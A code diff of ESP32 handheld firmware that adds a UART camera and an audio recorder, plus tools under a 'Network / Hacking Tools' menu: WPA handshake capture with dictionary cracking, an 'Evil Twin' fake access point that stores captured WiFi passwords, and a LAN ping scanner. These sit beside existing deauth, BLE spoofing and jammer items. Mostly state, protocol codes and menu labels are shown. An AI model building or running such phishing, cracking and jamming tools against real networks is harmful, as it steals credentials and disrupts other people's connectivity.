@@ -10,7 +10,9 @@
 #endif
 
 #include <WiFi.h>
+#include <ping/ping_sock.h>
 #include <WebServer.h>
+#include <DNSServer.h>
 #include <WiFiManager.h>
 #include <time.h>
 
@@ -88,6 +90,7 @@ static const char *BMP_PATH = "/img.bmp";
 static const char *GIF_PATH = "/img.gif";
 static const char *MATRIX_PATH = "/matrix_rgb.bin";
 static const char *CAM_URL_PATH = "/cam_url.txt";
+static const char *XIAO_WEB_URL_PATH = "/xiao_web_url.txt";
 
 // =========================================================
 // Limits / colors
@@ -173,6 +176,7 @@ enum AppMode : uint8_t {
   APP_VIEW_GIF,
   APP_GAME,
   APP_CAMERA,
+  APP_AUDIO_RECORD,
   APP_MATRIX_TEXT
 };
 
@@ -187,14 +191,20 @@ static uint32_t lastMediaStamp = 0;
 static String bmpViewPath = BMP_PATH;
 
 // Camera / MJPEG
-static String cameraUrl = "http://192.168.25.66:4747/video";
+static String cameraUrl = "uart://cam";
 static String cameraBoundary = "";
 static String cameraLastError = "";
 static String cameraCapturePath = "";
+static String xiaoWebUrl = "";
 static WiFiClient cameraClient;
 static bool cameraStreamReady = false;
 static bool cameraCapturePending = false;
 static bool cameraCaptureActive = false;
+static bool cameraAudioRecActive = false;
+static bool cameraAudioRecPaused = false;
+static uint32_t cameraAudioRecSeconds = 0;
+static String cameraAudioRecFile = "";
+static String cameraAudioRecStateText = "Ready";
 static uint32_t cameraLastConnectMs = 0;
 static uint32_t cameraLastFrameMs = 0;
 static uint8_t cameraFailCount = 0;
@@ -219,6 +229,118 @@ static bool cameraSkipTftDuringCapture = false;
 static uint32_t cameraCaptureIndicatorUntilMs = 0;
 static uint8_t prevTftRotation = 0;
 static bool cameraRotationSaved = false;
+static const uint8_t CAMERA_TFT_ROTATION = 3; // 180 deg from normal rotation 3
+static const int CAM_UART_RX_PIN = 44;
+static const int CAM_UART_TX_PIN = 43;
+static const uint32_t CAM_UART_BAUD = 921600;
+static const uint16_t CAMERA_UART_MAX_W = 160;
+static const uint16_t CAMERA_UART_MAX_H = 120;
+static const uint16_t CAMERA_UART_PAYLOAD_MAX = 1024;
+static const uint8_t CAM_PKT_HEAD1 = 0xC3;
+static const uint8_t CAM_PKT_HEAD2 = 0x3C;
+static const uint8_t CAM_PKT_TAIL1 = 0xA5;
+static const uint8_t CAM_PKT_TAIL2 = 0x5A;
+enum CameraUartPacketType : uint8_t {
+  CAM_PKT_FRAME_START = 0x01,
+  CAM_PKT_LINE = 0x02,
+  CAM_PKT_FRAME_END = 0x03,
+  CAM_PKT_PING = 0x04,
+  CAM_PKT_CMD = 0x10,
+  CAM_PKT_CAPTURE_START = 0x20,
+  CAM_PKT_CAPTURE_CHUNK = 0x21,
+  CAM_PKT_CAPTURE_END = 0x22,
+  CAM_PKT_CAPTURE_ACK = 0x23,
+  CAM_PKT_STATUS = 0x30,
+  CAM_PKT_SD_LIST_CHUNK = 0x31,
+  CAM_PKT_SD_LIST_END = 0x32,
+
+  // WIFI Offload via XIAO
+  CAM_PKT_WIFI_SCAN_CMD = 0x50,
+  CAM_PKT_WIFI_SCAN_RES = 0x51,
+  CAM_PKT_DEAUTH_ATK_CMD = 0x52,
+  CAM_PKT_DEAUTH_ATK_STAT = 0x53,
+  CAM_PKT_CRACK_DICT_REQ = 0x60,
+  CAM_PKT_CRACK_DICT_RES = 0x61,
+  CAM_PKT_CRACK_CAP_START = 0x62,
+  CAM_PKT_CRACK_STAT = 0x63,
+  CAM_PKT_CRACK_RUN_START = 0x64,
+
+  // IP Scanning (LAN Scanner)
+  CAM_PKT_LAN_SCAN_CMD = 0x70,
+  CAM_PKT_LAN_SCAN_RES = 0x71,
+  CAM_PKT_LAN_SCAN_STAT = 0x72,
+
+  // File Pull Protocol
+  CAM_PKT_FILE_PULL_REQ = 0x83,
+  CAM_PKT_FILE_PULL_RES = 0x84,
+  CAM_PKT_FILE_PULL_CHUNK = 0x85,
+  CAM_PKT_FILE_PULL_ACK = 0x86,
+  CAM_PKT_FILE_PULL_END = 0x87,
+
+  // Evil Twin Phishing
+  CAM_PKT_EVIL_TWIN_CMD = 0x80,
+  CAM_PKT_EVIL_TWIN_STAT = 0x81,
+  CAM_PKT_EVIL_TWIN_CREDS = 0x82
+};
+static const uint8_t CAM_CMD_CAPTURE_3MP = 0x31;
+static const uint8_t CAM_CMD_SET_STREAM_CTRL = 0x32;
+static const uint8_t CAM_CMD_REC_START = 0x41;
+static const uint8_t CAM_CMD_REC_STOP = 0x42;
+static const uint8_t CAM_CMD_SD_LIST = 0x43;
+static const uint8_t CAM_CMD_WEB_SERVER = 0x44;
+static const uint8_t CAM_CMD_WIFI_CFG = 0x45;
+static const uint8_t CAM_CMD_TIME_SET = 0x46;
+static const uint8_t CAM_CMD_AUDIO_REC_START = 0x47;
+static const uint8_t CAM_CMD_AUDIO_REC_STOP = 0x48;
+static const uint8_t CAM_CMD_FILE_PUSH_START = 0x49;
+static const uint8_t CAM_CMD_FILE_PUSH_CHUNK = 0x4A;
+static const uint8_t CAM_CMD_FILE_PUSH_END = 0x4B;
+static const uint8_t CAM_CMD_AUDIO_REC_PAUSE = 0x4C;
+static const uint8_t CAM_CMD_AUDIO_REC_RESUME = 0x4D;
+static const uint8_t CAM_MODE_PHOTO = 0;
+static const uint8_t CAM_MODE_VIDEO = 1;
+static const char *CAM_FILTER_NAMES[] = {"Natural", "Vivid", "B/W", "Sepia", "Cool", "Warm"};
+static const uint8_t CAM_FILTER_COUNT = 6;
+static uint8_t cameraCtlFilter = 0;
+static int8_t cameraCtlBrightness = -1;
+static int8_t cameraCtlContrast = -1;
+static int8_t cameraCtlSaturation = -2;
+static uint32_t cameraCtlOverlayUntilMs = 0;
+static String cameraToastMessage = "";
+static uint32_t cameraToastUntilMs = 0;
+static uint8_t cameraModeAction = CAM_MODE_PHOTO;
+static bool cameraRecordActive = false;
+static bool cameraRecordStartPending = false;
+static bool cameraRecordStopPending = false;
+static bool cameraRecordProcessing = false;
+static const uint32_t CAMERA_REC_FRAME_IDLE_PAUSE_MS = 700;
+static const uint32_t CAMERA_REC_OVERLAY_REFRESH_MS = 350;
+static String cameraSdListCache = "";
+static bool cameraSdListPending = false;
+static bool cameraSdListLoading = false;
+static uint32_t cameraSdListLastUpdateMs = 0;
+static uint32_t cameraSdListRequestMs = 0;
+static uint8_t cameraUartPayloadBuf[CAMERA_UART_PAYLOAD_MAX];
+static uint16_t cameraUartFrameBuf[CAMERA_UART_MAX_W * CAMERA_UART_MAX_H];
+static uint16_t cameraUartPrevFrameBuf[CAMERA_UART_MAX_W * CAMERA_UART_MAX_H];
+static uint16_t cameraUartScaledLine[240];
+static uint16_t cameraUartFrameW = 96;
+static uint16_t cameraUartFrameH = 96;
+static bool cameraUartLineSeen[CAMERA_UART_MAX_H];
+static uint16_t cameraUartLinesReceived = 0;
+static bool cameraUartFrameReady = false;
+static bool cameraUartHavePrev = false;
+static bool cameraUartNeedClear = true;
+static uint32_t cameraUartDroppedFrames = 0;
+static File cameraUartCaptureFile;
+static bool cameraUartCaptureInProgress = false;
+static bool cameraUartCaptureCommandSent = false;
+static uint32_t cameraUartCaptureExpected = 0;
+static uint32_t cameraUartCaptureReceived = 0;
+static uint16_t cameraUartCaptureNextSeq = 0;
+static uint32_t cameraUartCaptureDeadlineMs = 0;
+static uint32_t cameraUartCaptureLastDataMs = 0;
+static bool cameraUartReady = false;
 // `prevUiScreenBeforeView` declared after `UiScreen` enum below.
 
 // =========================================================
@@ -273,6 +395,12 @@ enum UiScreen : uint8_t {
   UI_BLE_SPOOFER,
   UI_BLE_SCANNER,
   UI_RF_JAMMER,
+  UI_WIFI_CRACKER_SCAN,
+  UI_WIFI_CRACKER_DICT,
+  UI_WIFI_CRACKER_RUN,
+  UI_IP_SCANNING,
+  UI_EVIL_TWIN_SCAN,
+  UI_EVIL_TWIN_RUN,
 };
 
 enum UiIcon : uint8_t {
@@ -289,6 +417,7 @@ enum MediaMenuItem : uint8_t {
   MEDIA_ITEM_BMP = 0,
   MEDIA_ITEM_GIF,
   MEDIA_ITEM_CAMERA,
+  MEDIA_ITEM_RECORD,
   MEDIA_ITEM_COUNT
 };
 
@@ -297,6 +426,8 @@ enum SettingsMenuItem : uint8_t {
   SETTING_ITEM_LED_BR,
   SETTING_ITEM_UTC,
   SETTING_ITEM_WIFI,
+  SETTING_ITEM_WEBSERVER,
+  SETTING_ITEM_XIAO_WEBSERVER,
   SETTING_ITEM_IMU,
   SETTING_ITEM_UI_SFX,
   SETTING_ITEM_SLEEP_MODE,
@@ -332,17 +463,24 @@ enum SongMenuItem : uint8_t {
 };
 
 enum ToolsMenuItem : uint8_t {
-  TOOLS_ITEM_CALC = 0,
-  TOOLS_ITEM_STOPWATCH,
-  TOOLS_ITEM_TIMER,
-  TOOLS_ITEM_LAMP,
-  TOOLS_ITEM_DEAUTH,
-  TOOLS_ITEM_TEXT_LED,
-  TOOLS_ITEM_NOTE_EDITOR,
-  TOOLS_ITEM_FILE,
+  // --- Network / Hacking Tools ---
+  TOOLS_ITEM_DEAUTH = 0,
+  TOOLS_ITEM_WIFI_CRACK,
+  TOOLS_ITEM_EVIL_TWIN,
+  TOOLS_ITEM_NET_PROBE,
   TOOLS_ITEM_BLE_SPOOF,
   TOOLS_ITEM_BLE_SCAN,
   TOOLS_ITEM_RF_JAMMER,
+  // --- Displays / Files ---
+  TOOLS_ITEM_TEXT_LED,
+  TOOLS_ITEM_NOTE_EDITOR,
+  TOOLS_ITEM_FILE,
+  // --- Utilities ---
+  TOOLS_ITEM_CALC,
+  TOOLS_ITEM_STOPWATCH,
+  TOOLS_ITEM_TIMER,
+  TOOLS_ITEM_LAMP,
+
   TOOLS_ITEM_COUNT,
 };
 
@@ -453,10 +591,24 @@ static bool lampIdleDirtyBefore = false;
 static CRGB lampSceneBackup[8][8];
 static bool lampSceneSaved = false;
 static const uint8_t LAMP_SAFE_BRIGHTNESS = 72;
-static const uint8_t WIFI_SCAN_MAX = 8;
+static const uint8_t WIFI_SCAN_MAX = 50;
 static String wifiScanSsids[WIFI_SCAN_MAX];
 static int32_t wifiScanRssi[WIFI_SCAN_MAX];
+static uint8_t wifiScanAuth[WIFI_SCAN_MAX];
 static bool wifiScanOpen[WIFI_SCAN_MAX];
+
+// Konversi Auth Mode ESP-IDF ke String
+static String getEncryptionTypeStr(uint8_t authmode) {
+  switch(authmode) {
+    case 0: return "OPEN";     case 1: return "WEP";
+    case 2: return "WPAPSK";   case 3: return "WPA2PSK";
+    case 4: return "WPA_W2";   case 5: return "WPA2ENT";
+    case 6: return "WPA3PSK";  case 7: return "W2_W3";
+    case 8: return "WAPIPSK";  case 9: return "OWE";
+    default: return "UNK";
+  }
+}
+
 static uint8_t deauthScanBssids[WIFI_SCAN_MAX][6];
 static uint8_t deauthScanChannels[WIFI_SCAN_MAX];
 static uint8_t wifiScanCount = 0;
@@ -484,7 +636,23 @@ IRAM_ATTR void deauthSniffer(void *buf, wifi_promiscuous_pkt_type_t type); // pr
 static uint8_t deauthTargetBssid[6];
 static int deauthTargetChannel = 1;
 static String deauthTargetSsid = "";
-static uint16_t reasonListIndex = 1;
+
+  // --- WPA CRACKER STATE ---
+  static const uint8_t CRACKER_DICT_MAX = 100;
+  static String crackerDictFiles[CRACKER_DICT_MAX];
+  static char crackerSelectedDict[128] = "/rockyou.txt";
+  static uint8_t crackerDictCount = 0;
+  static uint8_t crackerDictIndex = 0;
+  static bool crackerHandshakeFound = false;
+  static String crackerPassword = "";
+  static uint32_t crackerHashTested = 0;
+  static bool crackerDone = false;
+  static String crackerCaptureStage = "IDLE";
+  static String crackerCaptureMetrics = "";
+  static uint32_t crackerDictReqLastMs = 0;
+  static uint8_t crackerDictReqRetry = 0;
+  static bool crackerDictReqDone = true;
+  // -------------------------
 
 struct DeauthReasonDef {
   uint16_t code;
@@ -500,11 +668,94 @@ static const DeauthReasonDef deauthReasonList[] = {
 };
 static const uint8_t deauthReasonCount = 25;
 
+static uint16_t reasonListIndex = 1;
 static uint16_t selectedReason = 1;
 
 static bool deauthKilling = false;
 static uint32_t lastDeauthSentMs = 0;
 static uint32_t deauthPacketsSent = 0;
+
+// =========================================================
+// IP Scanning (formerly IP Scanning)
+// =========================================================
+static bool ipScanActive = false;
+static uint8_t ipScanProgress = 0;
+static bool ipScanModePort = false; // default kembali ke ICMP Ping, dijaga 5 ping/sec (200ms)
+static bool crackerSavePcap = true;
+
+// ICMP Ping Setup
+static volatile bool _ping_success = false;
+static volatile bool _ping_done = false;
+static volatile bool _ping_ended = false;
+static void _on_ping_success(esp_ping_handle_t hndl, void *args) { _ping_success = true; _ping_done = true; }
+static void _on_ping_timeout(esp_ping_handle_t hndl, void *args) { _ping_done = true; }
+static void _on_ping_end(esp_ping_handle_t hndl, void *args) { _ping_ended = true; }
+bool netProbePing(IPAddress targetIP) {
+    _ping_success = false;
+    _ping_done = false;
+    _ping_ended = false;
+    esp_ping_config_t config = ESP_PING_DEFAULT_CONFIG();
+    config.target_addr.type = IPADDR_TYPE_V4;
+    config.target_addr.u_addr.ip4.addr = (uint32_t)targetIP;
+    config.count = 1;
+    config.timeout_ms = 50;
+    config.interval_ms = 50;
+
+    esp_ping_callbacks_t cbs;
+    cbs.cb_args = NULL;
+    cbs.on_ping_success = _on_ping_success;
+    cbs.on_ping_timeout = _on_ping_timeout;
+    cbs.on_ping_end = _on_ping_end;
+
+    esp_ping_handle_t ping;
+    esp_ping_new_session(&config, &cbs, &ping);
+    esp_ping_start(ping);
+    
+    uint32_t start = millis();
+    while(!_ping_done && millis() - start < 200) {
+        delay(2);
+    }
+    
+    esp_ping_stop(ping);
+    
+    start = millis();
+    while(!_ping_ended && millis() - start < 100) {
+        delay(2);
+    }
+    
+    esp_ping_delete_session(ping);
+    return _ping_success;
+}
+static uint8_t ipScanFoundCount = 0;
+static String ipScanFoundIPs[20];
+static String ipScanTargetIP = "";
+
+static uint32_t ipScanLastPingMs = 0;
+static uint8_t ipScanCurrentSuffix = 1;
+static WiFiClient ipScanClient;
+
+// =========================================================
+// Evil Twin Phishing state
+// =========================================================
+enum EvilTwinState {
+  EVIL_TWIN_OFF = 0,
+  EVIL_TWIN_PULLING,
+  EVIL_TWIN_RUNNING
+};
+static EvilTwinState evilTwinState = EVIL_TWIN_OFF;
+static bool evilTwinActive = false; // Kept for UI logic compat
+static String evilTwinTargetSsid = "";
+static String evilTwinDomain = "router.update.login";
+
+#define MAX_EVIL_TWIN_PASSWORDS 4
+static String evilTwinCapturedPwds[MAX_EVIL_TWIN_PASSWORDS];
+static uint8_t evilTwinCapturedCount = 0;
+static String evilTwinStatusMsg = "";
+static uint32_t evilTwinPullSize = 0;
+static uint32_t evilTwinPullRecv = 0;
+static File evilTwinFile;
+static WebServer* evilTwinServer = nullptr;
+static DNSServer* evilDnsServer = nullptr;
 
 // =========================================================
 // Matrix templates
@@ -927,8 +1178,8 @@ static uint16_t gifFrameDelayMs = 20;
 static const bool INVERT_ROLL = true;
 static const bool INVERT_PITCH = false;
 static bool waterMode = false;
-static uint8_t water[8][8];
-static uint8_t waterTmp[8][8];
+static uint16_t water[8][8];
+static uint16_t waterTmp[8][8];
 static uint32_t lastWaterStepMs = 0;
 
 // =========================================================
@@ -947,6 +1198,9 @@ static bool wifiAutoConnectPending = false;
 static bool wifiAutoConnectActive = false;
 static uint32_t wifiAutoConnectStartMs = 0;
 static const uint32_t WIFI_AUTO_CONNECT_TIMEOUT_MS = 4500;
+static bool webServerRunning = false;
+static bool webServerRoutesReady = false;
+static bool xiaoWebServerEnabled = false;
 
 // =========================================================
 // Prototypes
@@ -968,7 +1222,12 @@ static bool wifiCredentialsLoadFromFS();
 static bool wifiCredentialsSaveToFS(const String &ssid, const String &password);
 static void wifiForgetCredentials();
 static String wifiSettingsStatusText();
+static String webServerSettingsStatusText();
+static String xiaoWebSettingsStatusText();
 static void doNetworkInit();
+static void webServerSetupRoutes();
+static bool webServerStart();
+static void webServerStop();
 
 static void blInit();
 static void blApplyIfDirty();
@@ -1048,6 +1307,9 @@ static void tftDrawGifSleepClockScreen();
 static void tftRefreshSleepScreen();
 static void tftDrawCalcTool();
 static void tftDrawStopwatchTool();
+static void tftDrawIpScanning();
+static void tftDrawEvilTwinScan();
+static void tftDrawEvilTwinRun();
 static void tftDrawTimerTool();
 static void tftDrawLampTool();
 static void tftDrawValueScreen(const char *title, const String &value, int barValue, int vmin, int vmax);
@@ -1056,6 +1318,7 @@ static void tftDrawFooterIp();
 static void tftDrawBmpViewer();
 static void tftDrawGifStartOrError();
 static void tftDrawCameraStatus(const String &line1, const String &line2);
+static void tftDrawAudioRecordStatus();
 static void tftDrawGameMenu(bool force);
 static void tftDrawShooterHud(bool force);
 static void tftDrawTetrisHud(bool force);
@@ -1152,6 +1415,7 @@ static void gifLoopStep();
 
 static void waterReset();
 static void waterStep();
+static void stopDeauthIfActive();
 
 static void uiMarkDirty();
 static void uiEnter(UiScreen screen);
@@ -1197,16 +1461,57 @@ static void handleUploadStream();
 static void handleUploadDone();
 static void handleCameraUrlApi();
 static void handleCameraCaptureApi();
+static void handleCameraRecordApi();
+static void handleCameraSdListApi();
+static void handleCameraXiaoWebApi();
+static void handleCameraAudioRecordApi();
+static void handleFilesDeleteApi();
 
 static bool cameraUrlLoadFromFS();
 static bool cameraUrlSaveToFS();
+static bool xiaoWebUrlSaveToFS();
+static bool xiaoWebUrlLoadFromFS();
+static void cameraTryExtractAndStoreXiaoWebUrl(const String &statusText);
+static void cameraHandleUartStatusText(const String &statusText);
+static void cameraUartBackgroundPoll();
 static void cameraStop();
 static void cameraLoop();
 static void cameraCaptureRequest();
+static void cameraRecordStartRequest();
+static void cameraRecordStopRequest();
+static void cameraRequestSdList();
+static bool cameraFetchSdListSync(uint32_t timeoutMs);
 static bool cameraConnectStream();
 static bool cameraReadLine(String &out, uint32_t timeoutMs);
 static bool cameraReadBytes(uint8_t *buf, size_t len, uint32_t timeoutMs);
 static bool cameraParseUrl(const String &url, String &host, uint16_t &port, String &path);
+static bool cameraIsUartMode();
+static bool cameraUartEnsureInit();
+static bool cameraUartReadBytes(uint8_t *buf, size_t len, uint32_t timeoutMs);
+static uint8_t cameraUartCrc8Update(uint8_t crc, uint8_t data);
+static uint8_t cameraUartCrc8Buf(const uint8_t *buf, size_t len);
+static bool cameraUartSendPacket(uint8_t type, const uint8_t *payload, uint16_t len);
+static bool cameraUartSendCaptureAck(uint16_t seq);
+static bool cameraUartSendControlState();
+static bool cameraUartSendSimpleCommand(uint8_t cmd);
+static bool cameraUartSendWebServerState(bool enabled);
+static bool cameraUartSendWifiConfig(const String &ssid, const String &password);
+static bool cameraUartSendTimeNow();
+static bool cameraUartSendAudioRecord(bool start);
+static bool cameraUartSendAudioPause();
+static bool cameraUartSendAudioResume();
+static bool cameraUartSendJpgToXiao(const String &path);
+static bool cameraUartWaitPushChunkAck(uint16_t seq, uint32_t timeoutMs, String &failStatus);
+static bool cameraUartWaitPushResult(uint32_t timeoutMs, String &finalStatus);
+static void cameraUartSyncXiaoNetworkConfig();
+static bool cameraUartReadPacket(uint8_t &type, uint8_t *payload, uint16_t payloadCap, uint16_t &outLen);
+static void cameraUartComputeLayout();
+static void cameraUartRenderFrame();
+static void cameraUartDrawRecordingOverlay();
+static bool cameraUartSaveFrameBmp();
+static void cameraUartAbortCapture(const char *reason);
+static void cameraLoopUart();
+static void cameraUartResetFrameState();
 static bool cameraBeginCapture(uint16_t w, uint16_t h);
 static void cameraEndCapture();
 static bool cameraJpgDraw(int16_t x, int16_t y, uint16_t w, uint16_t h, uint16_t *data);
@@ -1498,6 +1803,17 @@ static String wifiSettingsStatusText() {
   return String("NO WIFI");
 }
 
+static String webServerSettingsStatusText() {
+  return webServerRunning ? String("RUNNING") : String("STOPPED");
+}
+
+static String xiaoWebSettingsStatusText() {
+  if (!xiaoWebServerEnabled) return String("STOPPED");
+  if (!webServerRunning) return String("WAIT WEB");
+  if (appMode == APP_CAMERA) return String("CAM OFF");
+  return String("RUNNING");
+}
+
 static bool sleepModeSaveToFS() {
   File f = LittleFS.open(SLEEP_MODE_PATH, "w");
   if (!f) return false;
@@ -1687,6 +2003,17 @@ static void btnUpdate(BtnState &b) {
 }
 
 static bool okShortClick() { return btnOk.releaseEvent && !btnOk.longFired; }
+
+static bool downShortClick() { return btnDown.releaseEvent && !btnDown.longFired; }
+
+static bool downLongPress() {
+  static bool prev = false;
+  bool now = btnDown.longFired && btnDown.stable;
+  bool fired = now && !prev;
+  prev = now;
+  if (!btnDown.stable) prev = false;
+  return fired;
+}
 
 static bool okLongPress() {
   static bool prev = false;
@@ -2128,30 +2455,98 @@ static void tftDrawMediaMenu() {
   tft.setTextColor(UI_MUTED);
   tft.setCursor(10, 40);
   tft.print("U/D:nav - OK:Pilih - OK (hold):back");
-  const char *labels[MEDIA_ITEM_COUNT] = {"BMP Viewer", "GIF Player", "Camera"};
+  const char *labels[MEDIA_ITEM_COUNT] = {"BMP Viewer", "GIF Player", "Camera", "Record"};
   String values[MEDIA_ITEM_COUNT] = {
     LittleFS.exists(BMP_PATH) ? String("READY") : String("EMPTY"),
     LittleFS.exists(GIF_PATH) ? String("READY") : String("EMPTY"),
-    WiFi.isConnected() ? String("READY") : String("NO WIFI")
+    WiFi.isConnected() ? String("READY") : String("NO WIFI"),
+    cameraAudioRecActive ? (cameraAudioRecPaused ? String("PAUSED") : String("RECORDING")) : String("READY")
   };
-  const uint8_t visibleCount = 3;
+  const uint8_t visibleCount = 4;
   uint8_t firstVisible = tftListFirstVisible(mediaMenuIndex, MEDIA_ITEM_COUNT, visibleCount);
   for (uint8_t row = 0; row < visibleCount; row++) {
     uint8_t i = firstVisible + row;
     if (i >= MEDIA_ITEM_COUNT) break;
-    int y = 62 + row * 58;
+    int y = 54 + row * 44;
     bool selected = (i == mediaMenuIndex);
-    tft.fillRoundRect(12, y, 216, 46, 10, selected ? UI_CARD_SEL : UI_CARD);
-    tft.drawRoundRect(12, y, 216, 46, 10, selected ? UI_ACCENT : UI_LINE);
+    tft.fillRoundRect(12, y, 216, 36, 10, selected ? UI_CARD_SEL : UI_CARD);
+    tft.drawRoundRect(12, y, 216, 36, 10, selected ? UI_ACCENT : UI_LINE);
     tft.setTextSize(2);
     tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
-    tft.setCursor(22, y + 8);
+    tft.setCursor(22, y + 4);
     tft.print(labels[i]);
     tft.setTextSize(1);
-    tft.setCursor(22, y + 29);
+    tft.setCursor(22, y + 23);
     tft.print(values[i]);
   }
   tftDrawListScrollbar(226, 64, 150, MEDIA_ITEM_COUNT, visibleCount, firstVisible);
+}
+
+static void tftDrawAudioRecordStatus() {
+  tft.fillScreen(ST77XX_BLACK);
+  tft.setTextSize(2);
+  tft.setTextColor(UI_ACCENT);
+  tft.setCursor(12, 18);
+  tft.print("Audio Recorder");
+
+  uint16_t stateColor = UI_WARN;
+  String stateText = "Ready";
+  if (cameraAudioRecActive && cameraAudioRecPaused) {
+    stateColor = ST77XX_YELLOW;
+    stateText = "Paused";
+  } else if (cameraAudioRecActive) {
+    stateColor = UI_OK;
+    stateText = "Recording";
+  }
+  if (cameraAudioRecStateText.length() > 0) stateText = cameraAudioRecStateText;
+
+  tft.fillRoundRect(12, 48, 216, 46, 10, UI_CARD);
+  tft.drawRoundRect(12, 48, 216, 46, 10, UI_LINE);
+  tft.setTextSize(2);
+  tft.setTextColor(stateColor);
+  tft.setCursor(20, 62);
+  tft.print(stateText);
+
+  uint32_t sec = cameraAudioRecSeconds;
+  uint32_t mm = sec / 60UL;
+  uint32_t ss = sec % 60UL;
+  char tm[12];
+  snprintf(tm, sizeof(tm), "%02lu:%02lu", (unsigned long)mm, (unsigned long)ss);
+
+  tft.fillRoundRect(12, 102, 216, 38, 10, UI_CARD);
+  tft.drawRoundRect(12, 102, 216, 38, 10, UI_LINE);
+  tft.setTextSize(1);
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(20, 112);
+  tft.print("Elapsed");
+  tft.setTextSize(2);
+  tft.setTextColor(UI_TEXT);
+  tft.setCursor(132, 110);
+  tft.print(tm);
+
+  tft.setTextSize(1);
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(12, 152);
+  tft.print("File:");
+  tft.setTextColor(UI_TEXT);
+  String fileName = cameraAudioRecFile;
+  if (fileName.length() == 0) fileName = "(belum ada)";
+  if (fileName.length() > 32) fileName = fileName.substring(fileName.length() - 32);
+  tft.setCursor(12, 166);
+  tft.print(fileName);
+
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(12, 184);
+  tft.print("Info:");
+  tft.setTextColor(UI_TEXT);
+  String info = cameraLastError;
+  if (info.length() > 34) info = info.substring(0, 34);
+  tft.setCursor(12, 198);
+  tft.print(info);
+
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(12, 220);
+  tft.print("UP:start/resume DOWN:pause OK:save");
 }
 
 static void tftDrawSettingsMenu() {
@@ -2161,12 +2556,14 @@ static void tftDrawSettingsMenu() {
   tft.setCursor(10, 40);
   tft.print("U/D:nav - OK:Pilih - OK (hold):back");
   tft.setTextWrap(false);
-  const char *labels[SETTING_ITEM_COUNT] = {"TFT Brightness", "LED Brightness", "UTC", "WiFi", "IMU", "UI Sound", "Sleep", "Clock", "Camera URL", "Buzzer Vol"};
+  const char *labels[SETTING_ITEM_COUNT] = {"TFT Brightness", "LED Brightness", "UTC", "WiFi", "Webserver", "XIAO Web", "IMU", "UI Sound", "Sleep", "Clock", "Camera URL", "Buzzer Vol"};
   String values[SETTING_ITEM_COUNT] = {
     String(gTftBacklight),
     String(gBrightness),
     fmtUtcOffset(),
     wifiSettingsStatusText(),
+    webServerSettingsStatusText(),
+    xiaoWebSettingsStatusText(),
     imuOn ? String("ON") : String("OFF"),
     uiSfxEnabled ? String("ON") : String("OFF"),
     String(sleepModeText(sleepMode)),
@@ -2238,13 +2635,11 @@ static void tftDrawWifiListMenu() {
       tft.print(wifiScanSsids[i]);
       tft.setTextSize(1);
       tft.setCursor(24, y + 22);
-      
       if (hasSaved && wifiScanSsids[i] == savedWifiSsid) {
         tft.print("SAVED");
       } else {
         tft.print(wifiScanOpen[i] ? "OPEN" : "LOCK");
       }
-      
       tft.setCursor(78, y + 22);
       tft.print(String(wifiScanRssi[i]) + " dBm");
     }
@@ -2742,19 +3137,43 @@ static void tftDrawToolsMenu() {
   tft.setTextColor(UI_MUTED);
   tft.setCursor(10, 40);
   tft.print("U/D:nav - OK:Pilih - OK (hold):back");
-  const char *labels[TOOLS_ITEM_COUNT] = {"Calculator", "Stopwatch", "Timer", "Lampu", "WiFi Killer", "Matrix Text", "Note Editor", "File Explorer", "BLE Spoofer", "BLE Monitor", "2.4GHz Jammer"};
+  const char *labels[TOOLS_ITEM_COUNT] = {
+    // --- Network / Hacking ---
+    "WiFi Killer",
+    "WiFi Cracking",
+    "Evil Twin",
+    "LAN Scanner",
+    "BLE Spoofer",
+    "BLE Monitor",
+    "2.4GHz Jammer",
+    // --- Displays / Files ---
+    "Matrix Text",
+    "Note Editor",
+    "File Explorer",
+    // --- Utilities ---
+    "Calculator",
+    "Stopwatch",
+    "Timer",
+    "Lampu"
+  };
   const char *descs[TOOLS_ITEM_COUNT] = {
+    // --- Network / Hacking ---
+    "Putus target WiFi",
+    "Capture WPA & Crack!",
+    "WiFi Fake AP Phishing",
+    "Subnet IP Scanner",
+    "Spam Apple Popups",
+    "Scan + deteksi BLE",
+    "NRF24 Multi Jammer",
+    // --- Displays / Files ---
+    "Run/static text matrix",
+    "Buat/edit nada buzzer",
+    "Kelola file system",
+    // --- Utilities ---
     "Hitung +/-/*/bagi cepat",
     "Start, pause, reset",
     "Mundur dengan bunyi",
-    lampOn ? "LED putih aktif" : "LED putih penerangan",
-    "Putus target WiFi",
-    "Run/static text matrix",
-    "Buat/edit nada buzzer",
-    "Kelola file",
-    "Spam Apple Popups",
-    "Scan + deteksi BLE",
-    "NRF24 Multi Jammer"
+    lampOn ? "LED putih aktif" : "LED putih penerangan"
   };
   const uint8_t visibleCount = 3;
   uint8_t firstVisible = tftListFirstVisible(toolsMenuIndex, TOOLS_ITEM_COUNT, visibleCount);
@@ -2904,8 +3323,8 @@ static void tftDrawFileAction() {
   tft.setCursor(10, 52);
   tft.print(explorerFileNames[explorerListIndex]);
 
-  const char *actions[] = {"Back", "View", "Delete"};
-  for (uint8_t i = 0; i < 3; i++) {
+  const char *actions[] = {"Back", "View", "Delete", "Send->XIAO"};
+  for (uint8_t i = 0; i < 4; i++) {
     int y = 70 + i * 42;
     bool selected = (i == uiIndex);
     tft.fillRoundRect(12, y, 216, 34, 10, selected ? UI_CARD_SEL : UI_CARD);
@@ -3498,11 +3917,25 @@ static void tftDrawBmpViewer() {
   int16_t drawX = 0;
   int16_t drawY = 0;
   const char *path = bmpViewPath.length() > 0 ? bmpViewPath.c_str() : BMP_PATH;
+
+  // Detect by extension and file signature so viewing works even with odd filenames.
+  uint8_t sig0 = 0, sig1 = 0;
+  File sf = LittleFS.open(path, "r");
+  if (sf) {
+    if (sf.available() >= 2) {
+      sig0 = (uint8_t)sf.read();
+      sig1 = (uint8_t)sf.read();
+    }
+    sf.close();
+  }
+  bool looksJpg = (sig0 == 0xFF && sig1 == 0xD8);
+  bool looksBmp = (sig0 == 'B' && sig1 == 'M');
+
   // support viewing JPEGs as well as BMPs
   String sp = String(path);
   sp.toLowerCase();
-  if (sp.endsWith(".jpg") || sp.endsWith(".jpeg")) {
-    if (!tftDrawJpgFromFS(path)) {
+  if (sp.endsWith(".jpg") || sp.endsWith(".jpeg") || looksJpg) {
+    if (!tftDrawJpgFromFS(path) && !tftDrawBmpFromFS(path, 0, 0)) {
